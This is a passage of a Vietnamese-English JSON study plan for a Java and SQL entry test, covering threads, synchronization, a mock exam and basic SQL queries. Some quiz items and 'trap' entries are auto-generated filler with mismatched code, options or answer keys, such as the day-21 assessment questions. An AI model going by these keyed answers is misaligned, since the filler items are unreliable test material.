          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        },
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        }
      ],
      "chapter": "Chapter 8: Inner Classes"
    },
    "20": {
      "day": 20,
      "week": 3,
      "title": "Chapter 9: Threads & Concurrency",
      "topics": [
        "Thread vs Runnable: start() vs run()",
        "Thread lifecycle: New, Runnable, Running, Blocked/Waiting, Terminated",
        "Thread methods: sleep(), yield(), join()",
        "Synchronization & Locks: synchronized method vs block",
        "Inter-thread communication: wait(), notify(), notifyAll() (phải gọi trong synchronized block)"
      ],
      "tasks": [
        "Tự viết ví dụ synchronized tránh race condition",
        "Làm 25 câu TestKing Threads"
      ],
      "englishDrill": [
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        },
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        }
      ],
      "summary": "Chapter 9: Threads & Concurrency - Thread vs Runnable, Lifecycle, Synchronized & Locks.",
      "coreTheory": "\n### 1. Khởi tạo Thread: start() vs run()\n- `t.start()`: Cấp phát Stack mới, tạo luồng thực thi độc lập của hệ điều hành, rồi gọi `run()` bất đồng bộ.\n- `t.run()`: Chỉ là lời gọi phương thức thông thường, chạy đồng bộ tuần tự trên chính thread hiện tại (main), KHÔNG tạo luồng mới!\n\n### 2. Đồng bộ hóa (Synchronization) & Lock/Monitor\n- Từ khóa `synchronized` dùng để khóa tài nguyên chia sẻ, ngăn ngừa Data Race / Race Condition.\n- `wait()`, `notify()`, `notifyAll()` thuộc class `Object`, **bắt buộc phải gọi trong khối synchronized** đang giữ khóa của chính object đó.\n- `Thread.sleep()` tạm dừng nhưng **GIỮ NGUYÊN KHÓA**.\n- `object.wait()` tạm dừng và **GIẢI PHÓNG KHÓA**.\n",
      "codeSnippet": "Thread t = new Thread(() -> {\n    System.out.println(Thread.currentThread().getName());\n});\nt.run();   // In ra: main (chạy tuần tự)\nt.start(); // In ra: Thread-0 (chạy bất đồng bộ trên luồng mới)",
      "traps": [
        "Gọi wait() ngoài khối synchronized ném IllegalMonitorStateException.",
        "Sleep giữ khóa, Wait nhả khóa."
      ],
      "quickQuiz": [
        {
          "q": "Phương thức wait() thuộc class nào?",
          "a": "java.lang.Object"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Thread vs Runnable: start() vs run(), Thread lifecycle: New, Runnable, Running, Blocked/Waiting, Terminated, Thread methods: sleep(), yield(), join().",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Khởi tạo Thread: start() vs run()\n- `t.start()`: Cấp phát Stack mới, tạo luồng thực thi độc lập của hệ điều hành, rồi gọi `run()` bất đồng bộ.\n- `t.run()`: Chỉ là lời gọi phương thức thông thường, chạy đồng bộ tuần tự trên chính thread hiện tại (main), KHÔNG tạo luồng mới!\n\n### 2. Đồng bộ hóa (Synchronization) & Lock/Monitor\n- Từ khóa `synchronized` dùng để khóa tài nguyên chia sẻ, ngăn ngừa Data Race / Race Condition.\n- `wait()`, `notify()`, `notifyAll()` thuộc class `Object`, **bắt buộc phải gọi trong khối synchronized** đang giữ khóa của chính object đó.\n- `Thread.sleep()` tạm dừng nhưng **GIỮ NGUYÊN KHÓA**.\n- `object.wait()` tạm dừng và **GIẢI PHÓNG KHÓA**.\n",
          "code": "Thread t = new Thread(() -> {\n    System.out.println(Thread.currentThread().getName());\n});\nt.run();   // In ra: main (chạy tuần tự)\nt.start(); // In ra: Thread-0 (chạy bất đồng bộ trên luồng mới)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d20_1",
          "level": "Medium",
          "question": "Chương trình đa luồng sau in ra kết quả gì?",
          "code": "public class ThreadTrace {\n    public static void main(String[] args) {\n        Thread t = new Thread(() -> {\n            System.out.print(\"A \");\n        });\n        t.run();\n        System.out.print(\"B \");\n    }\n}",
          "options": [
            "A B ",
            "B A ",
            "Thứ tự không xác định tùy CPU",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "Rất nhiều người bị bẫy ở đây! Gọi `t.run()` KHÔNG hề tạo ra luồng mới, nó chỉ là một lệnh gọi phương thức bình thường chạy trên luồng Main hiện tại. Do đó code chạy tuần tự 100%: in 'A ' trước rồi in 'B ' sau -> Chắc chắn in: `A B `."
        }
      ],
      "examTraps": [
        {
          "trap": "Gọi wait() hoặc notify() bên ngoài khối synchronized",
          "whyPeopleWrong": "Tưởng rằng có thể gọi obj.wait() ở bất kỳ đâu trong code.",
          "wrongThinking": "Nghĩ rằng method của Object thì gọi ở đâu cũng được.",
          "correctRule": "Để gọi obj.wait() hoặc obj.notify(), luồng bắt buộc phải đang nắm giữ Monitor Lock của đối tượng đó (phải nằm trong khối synchronized(obj)). Nếu không sẽ bị ném lỗi java.lang.IllegalMonitorStateException!",
          "code": "Object lock = new Object();\n// lock.wait(); // RUNTIME ERROR: IllegalMonitorStateException!\nsynchronized(lock) {\n    lock.wait(); // HỢP LỆ VÌ ĐÃ NẮM LOCK\n}",
          "miniCheck": "Trước khi gọi wait() hay notify(), hãy nhìn xem có từ khóa synchronized trên đúng đối tượng đó hay chưa!"
        },
        {
          "trap": "Cạm bẫy 1: Gọi wait() ngoài khối synchronized ném IllegalMonitorStateException.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Thread t = new Thread(() -> {\n    System.out.println(Thread.currentThread().getName());\n});\nt.run();   // In ra: main (chạy tuần tự)\nt.start(); // In ra: Thread-0 (chạy bất đồng bộ trên luồng mới)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Sleep giữ khóa, Wait nhả khóa.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Thread t = new Thread(() -> {\n    System.out.println(Thread.currentThread().getName());\n});\nt.run();   // In ra: main (chạy tuần tự)\nt.start(); // In ra: Thread-0 (chạy bất đồng bộ trên luồng mới)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vòng đời của Thread và Monitor",
          "questions": [
            {
              "q": "Kể tên các trạng thái trong vòng đời của Thread (`Thread.State`) trong Java.",
              "ans": "`NEW`, `RUNNABLE`, `BLOCKED`, `WAITING`, `TIMED_WAITING`, `TERMINATED`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế wait(), notify() và IllegalMonitorStateException",
          "questions": [
            {
              "q": "Tại sao phương thức `wait()` và `notify()` thuộc về class `Object` chứ không phải class `Thread`, và tại sao phải gọi chúng trong khối `synchronized`?",
              "ans": "Vì monitor lock gắn liền với từng đối tượng (Object-level lock) trong Java. Luồng gọi `wait()` phải nắm giữ monitor lock của đối tượng đó trước; nếu gọi ngoài khối `synchronized`, JVM lập tức ném ngoại lệ `java.lang.IllegalMonitorStateException`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace luồng start() vs run()",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nThread t = new Thread(() -> System.out.print(\"Thread \"));\nt.run();\nSystem.out.print(\"Main \");\n```\nĐoạn code này có tạo thread mới trong OS không và thứ tự in là gì?",
              "ans": "Không tạo thread mới! Gọi `t.run()` chỉ đơn thuần gọi một phương thức thông thường ngay trên `main` thread, nên in ra tuần tự: `Thread Main `."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy gọi start() hai lần trên một Thread",
          "questions": [
            {
              "q": "Điều gì xảy ra khi gọi `t.start(); t.start();` trên cùng một Thread object?",
              "ans": "Lần gọi thứ 2 sẽ ném ra ngoại lệ `java.lang.IllegalThreadStateException` lúc runtime vì thread không thể khởi động lại khi đã rời khỏi trạng thái `NEW`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Deadlock và thứ tự giành khóa",
          "questions": [
            {
              "q": "Nguyên nhân cốt lõi gây ra hiện tượng Deadlock (khóa chết) giữa 2 luồng và cách phòng ngừa chuẩn nhất là gì?",
              "ans": "Nguyên nhân: Hai hay nhiều luồng chờ đợi tài nguyên khóa lẫn nhau theo vòng tròn (Circular Wait, ví dụ luồng 1 giữ khóa A chờ khóa B, luồng 2 giữ khóa B chờ khóa A). Cách phòng ngừa: Luôn tuân thủ một thứ tự giành khóa nhất quán (Lock Ordering) trên toàn bộ hệ thống (ví dụ mọi luồng đều phải lấy khóa A trước rồi mới được lấy khóa B)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_20_1",
          "q": "Phương thức wait(), notify(), notifyAll() được định nghĩa trong class nào của Java?",
          "options": [
            "java.lang.Object",
            "java.lang.Thread",
            "java.lang.Runnable",
            "java.util.concurrent.Executor"
          ],
          "correct": 0,
          "exp": "wait(), notify(), notifyAll() thuộc class java.lang.Object vì chúng thao tác trực tiếp trên Khóa nội tại (Monitor Lock) của đối tượng chứ không phải của luồng."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khác biệt cốt lõi giữa gọi `thread.start()` và gọi `thread.run()`?",
          "a": "- `start()`: Yêu cầu JVM cấp phát Call Stack mới và tạo một luồng hệ điều hành riêng biệt để chạy phương thức `run()` bất đồng bộ.\n- `run()`: Chỉ là một phương thức bình thường, chạy tuần tự trên CHÍNH LUỒNG HIỆN TẠI (Main thread), không hề tạo ra luồng mới.",
          "trap": "Gọi `t.run()` thì chương trình vẫn chạy tuần tự đơn luồng, không có tính đa luồng!"
        },
        {
          "q": "Một Thread sau khi đã chạy xong (`DEAD` / `TERMINATED`) có thể gọi lại `t.start()` lần 2 không?",
          "a": "KHÔNG THỂ. Khi một thread đã ở trạng thái TERMINATED hoặc đã start rồi, gọi lại `start()` sẽ ném ngay ngoại lệ `IllegalThreadStateException`.",
          "trap": "TestKing rất hay bẫy câu hỏi gọi `t.start()` 2 lần liên tiếp trên cùng 1 biến thread."
        },
        {
          "q": "Các phương thức `wait()`, `notify()`, `notifyAll()` thuộc class nào và gọi ở đâu?",
          "a": "Chúng thuộc class `java.lang.Object` (không phải class Thread). Chúng BẮT BUỘC phải được gọi bên trong khối hoặc phương thức có từ khóa `synchronized` đang giữ monitor của object đó, nếu không sẽ ném `IllegalMonitorStateException`.",
          "trap": "Nhầm tưởng wait/notify thuộc về class Thread giống như sleep/join."
        }
      ],
      "dailyEnglish": [
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        },
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        }
      ],
      "chapter": "Chapter 9: Threads & Concurrency"
    },
    "21": {
      "day": 21,
      "week": 3,
      "title": "Java Core Mock Exam #1",
      "topics": [
        "Đánh giá toàn bộ 9 chương Java Core"
      ],
      "tasks": [
        "Làm đề thi thử 30 câu Java Core",
        "Thống kê tỷ lệ đúng theo từng Chapter (1-9) để tìm điểm yếu",
        "Ôn tập lại các câu sai"
      ],
      "englishDrill": [
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        },
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        }
      ],
      "summary": "JAVA CORE MOCK EXAM #1 (Tổng hợp toàn diện 9 chương Java Core Ch1-Ch9).",
      "coreTheory": "\n### Rà soát 9 chương Java Core:\n1. Ch1: Cú pháp, Kiểu nguyên thủy, Ranges, Mảng.\n2. Ch2: Modifiers, Class/Interface declarations.\n3. Ch3: Operators, Precedence, Bitwise, Casting.\n4. Ch4: Flow control, Switch, Exception hierarchy.\n5. Ch5: OOP, Encapsulation, Overloading/Overriding, Constructors.\n6. Ch6: String Pool, Wrappers, Integer Cache.\n7. Ch7: Collections (List/Set/Map), equals/hashCode contract.\n8. Ch8: Inner classes.\n9. Ch9: Threads, Synchronization, wait/notify.\n",
      "codeSnippet": "// Thi thử 30 câu Java Core trên Web App",
      "traps": [
        "Ghi chú tỷ lệ đúng của từng chương để phát hiện chương nào còn yếu."
      ],
      "quickQuiz": [
        {
          "q": "Hai luồng cùng gọi `t1.join()` và `t2.join()` có nghĩa là gì?",
          "a": "Luồng hiện tại (ví dụ main thread) sẽ bị block và chuyển sang trạng thái WAITING cho đến khi thread `t1` và `t2` hoàn thành xong công việc mới chạy tiếp."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Đánh giá toàn bộ 9 chương Java Core.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Rà soát 9 chương Java Core:\n1. Ch1: Cú pháp, Kiểu nguyên thủy, Ranges, Mảng.\n2. Ch2: Modifiers, Class/Interface declarations.\n3. Ch3: Operators, Precedence, Bitwise, Casting.\n4. Ch4: Flow control, Switch, Exception hierarchy.\n5. Ch5: OOP, Encapsulation, Overloading/Overriding, Constructors.\n6. Ch6: String Pool, Wrappers, Integer Cache.\n7. Ch7: Collections (List/Set/Map), equals/hashCode contract.\n8. Ch8: Inner classes.\n9. Ch9: Threads, Synchronization, wait/notify.\n",
          "code": "// Thi thử 30 câu Java Core trên Web App"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_21_1",
          "level": "Easy",
          "question": "Chương nào bạn làm sai nhiều nhất?",
          "code": "// Thi thử 30 câu Java Core trên Web App",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Mở tab Flashcards lọc chương đó để cày lại."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Ghi chú tỷ lệ đúng của từng chương để phát hiện chương nào còn yếu.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Thi thử 30 câu Java Core trên Web App",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tổng hợp Đa luồng và Bộ nhớ",
          "questions": [
            {
              "q": "Từ khóa `volatile` đảm bảo được điều gì và KHÔNG đảm bảo được điều gì trong đa luồng?",
              "ans": "Đảm bảo tính hiển thị (Visibility) và ngăn chặn sắp xếp lại lệnh (reordering). KHÔNG đảm bảo tính nguyên tử (Atomicity) cho các thao tác phức hợp như `count++`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Đồng bộ hóa phương thức static vs non-static",
          "questions": [
            {
              "q": "Một luồng đang chạy phương thức `synchronized static void m1()` và một luồng khác gọi `synchronized void m2()` trên cùng một instance có bị chặn (block) nhau không?",
              "ans": "Không bị chặn! `m1()` khóa trên đối tượng `Class` (`MyClass.class`), trong khi `m2()` khóa trên đối tượng thể hiện `this` (`instance lock`). Hai monitor lock này hoàn toàn độc lập nhau."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Thread.join()",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nThread t = new Thread(() -> {\n    try { Thread.sleep(100); } catch (Exception e) {}\n    System.out.print(\"T \");\n});\nt.start();\nt.join();\nSystem.out.print(\"M \");\n```\nKết quả in ra là gì?",
              "ans": "In ra: `T M `. Nhờ có lệnh `t.join()`, luồng `main` sẽ tạm dừng và đợi cho đến khi luồng `t` kết thúc hoàn toàn rồi mới in ra 'M'."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy sleep() không giải phóng monitor lock",
          "questions": [
            {
              "q": "Phương thức `Thread.sleep()` khác phương thức `Object.wait()` ở điểm mấu chốt nào liên quan đến Lock?",
              "ans": "`wait()` sẽ giải phóng (release) monitor lock để các luồng khác có cơ hội thực thi. `Thread.sleep()` tạm dừng thời gian nhưng VẪN GIỮ NGUYÊN (holds) mọi monitor lock mà nó đang sở hữu!"
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "ThreadLocal và nguy cơ rò rỉ bộ nhớ trong ThreadPool",
          "questions": [
            {
              "q": "Tại sao khi sử dụng `ThreadLocal` với ThreadPool (ví dụ Tomcat worker threads) bắt buộc phải gọi `threadLocal.remove()` trong khối `finally`?",
              "ans": "Vì worker thread trong pool được tái sử dụng liên tục (không bị hủy). Nếu không gọi `remove()`, dữ liệu của request cũ sẽ tồn tại mãi mãi trong `ThreadLocalMap` của thread đó, dẫn tới rò rỉ dữ liệu giữa các người dùng và tràn bộ nhớ Metaspace/Heap."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_21_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Đánh giá toàn bộ 9 chương Java Core?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Đánh giá toàn bộ 9 chương Java Core phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Đánh giá toàn bộ 9 chương Java Core."
        },
        {
          "id": "da_21_2",
          "q": "Khi thao tác với Đánh giá toàn bộ 9 chương Java Core, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Mục tiêu bài thi Mock Exam #1 Java Core",
          "a": "Đánh giá toàn diện 9 chương Java Core với 40 câu hỏi trắc nghiệm chuẩn format FSOFT Entry Test. Yêu cầu đạt tối thiểu 75% để đủ điều kiện pass vòng lý thuyết.",
          "trap": "Quản lý thời gian dưới 60s/câu."
        }
      ],
      "dailyEnglish": [
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        },
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        }
      ]
    },
    "22": {
      "day": 22,
      "week": 4,
      "title": "SQL: DDL, DML & Basic Queries",
      "topics": [
        "SELECT, WHERE, ORDER BY (ASC/DESC)",
        "Operators: LIKE, BETWEEN, IN, IS NULL",
        "INSERT, UPDATE, DELETE vs TRUNCATE",
        "Primary Key vs Foreign Key constraints"
      ],
      "tasks": [
        "Luyện viết 15 câu query cơ bản",
        "Lập bảng phân biệt DELETE vs TRUNCATE vs DROP"
      ],
      "englishDrill": [
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        },
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        }
      ],
      "summary": "SQL Căn Bản: SELECT, WHERE, Operators, DDL vs DML (DELETE vs TRUNCATE).",
      "coreTheory": "\n### 1. DDL (Data Definition) vs DML (Data Manipulation)\n- **DELETE (DML):** Xóa từng dòng dữ liệu, có thể kèm điều kiện `WHERE`. Ghi log từng dòng, có thể `ROLLBACK`.\n- **TRUNCATE (DDL):** Xóa toàn bộ bảng bằng cách giải phóng data pages, reset Identity về 1. Cực nhanh, không dùng được `WHERE`.\n- **DROP (DDL):** Xóa hoàn toàn bảng và định nghĩa cấu trúc bảng khỏi database.\n\n### 2. Các toán tử lọc điều kiện trong WHERE\n- `LIKE '%abc%'` (ký tự đại diện `%` là chuỗi bất kỳ, `_` là 1 ký tự).\n- `BETWEEN a AND b` (bao gồm cả giá trị a và b).\n- `IN (val1, val2, ...)`\n- `IS NULL` / `IS NOT NULL` (không dùng `= NULL`).\n",
      "codeSnippet": "-- Xóa có điều kiện\nDELETE FROM Employees WHERE salary < 500;\n\n-- Xóa sạch dữ liệu bảng cực nhanh\nTRUNCATE TABLE TempLogs;",
      "traps": [
        "Không bao giờ dùng `= NULL` trong SQL, bắt buộc dùng `IS NULL`.",
        "TRUNCATE không thể chạy nếu bảng đang bị Foreign Key tham chiếu."
      ],
      "quickQuiz": [
        {
          "q": "DELETE khác TRUNCATE ở điểm nào?",
          "a": "DELETE xóa từng dòng có WHERE và rollback được; TRUNCATE xóa sạch cực nhanh không có WHERE."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: SELECT, WHERE, ORDER BY (ASC/DESC), Operators: LIKE, BETWEEN, IN, IS NULL, INSERT, UPDATE, DELETE vs TRUNCATE.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. DDL (Data Definition) vs DML (Data Manipulation)\n- **DELETE (DML):** Xóa từng dòng dữ liệu, có thể kèm điều kiện `WHERE`. Ghi log từng dòng, có thể `ROLLBACK`.\n- **TRUNCATE (DDL):** Xóa toàn bộ bảng bằng cách giải phóng data pages, reset Identity về 1. Cực nhanh, không dùng được `WHERE`.\n- **DROP (DDL):** Xóa hoàn toàn bảng và định nghĩa cấu trúc bảng khỏi database.\n\n### 2. Các toán tử lọc điều kiện trong WHERE\n- `LIKE '%abc%'` (ký tự đại diện `%` là chuỗi bất kỳ, `_` là 1 ký tự).\n- `BETWEEN a AND b` (bao gồm cả giá trị a và b).\n- `IN (val1, val2, ...)`\n- `IS NULL` / `IS NOT NULL` (không dùng `= NULL`).\n",
          "code": "-- Xóa có điều kiện\nDELETE FROM Employees WHERE salary < 500;\n\n-- Xóa sạch dữ liệu bảng cực nhanh\nTRUNCATE TABLE TempLogs;"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_22_1",
          "level": "Easy",
          "question": "DELETE khác TRUNCATE ở điểm nào?",
          "code": "-- Xóa có điều kiện\nDELETE FROM Employees WHERE salary < 500;\n\n-- Xóa sạch dữ liệu bảng cực nhanh\nTRUNCATE TABLE TempLogs;",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "DELETE xóa từng dòng có WHERE và rollback được; TRUNCATE xóa sạch cực nhanh không có WHERE."
        }
      ],
      "examTraps": [
        {
          "trap": "So sánh NULL bằng dấu '=' thay vì dùng 'IS NULL'",
          "whyPeopleWrong": "Quen tay viết WHERE salary = NULL.",
          "wrongThinking": "Tưởng rằng NULL là một giá trị có thể so sánh bằng dấu =.",
          "correctRule": "Trong chuẩn SQL, NULL đại diện cho trạng thái 'không xác định'. Biểu thức 'salary = NULL' luôn luôn trả về UNKNOWN (coi như false). Bắt buộc phải dùng toán tử 'IS NULL' hoặc 'IS NOT NULL'!",
          "code": "-- SELECT * FROM emp WHERE manager_id = NULL; -- KHÔNG BAO GIỜ TRẢ VỀ KẾT QUẢ!\nSELECT * FROM emp WHERE manager_id IS NULL; -- HỢP LỆ CHUẨN XÁC",
          "miniCheck": "Trong SQL, tuyệt đối không dùng = NULL, luôn luôn dùng IS NULL."
        },
        {
          "trap": "Cạm bẫy 1: Không bao giờ dùng `= NULL` trong SQL, bắt buộc dùng `IS NULL`.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "-- Xóa có điều kiện\nDELETE FROM Employees WHERE salary < 500;\n\n-- Xóa sạch dữ liệu bảng cực nhanh\nTRUNCATE TABLE TempLogs;",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: TRUNCATE không thể chạy nếu bảng đang bị Foreign Key tham chiếu.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "-- Xóa có điều kiện\nDELETE FROM Employees WHERE salary < 500;\n\n-- Xóa sạch dữ liệu bảng cực nhanh\nTRUNCATE TABLE TempLogs;",
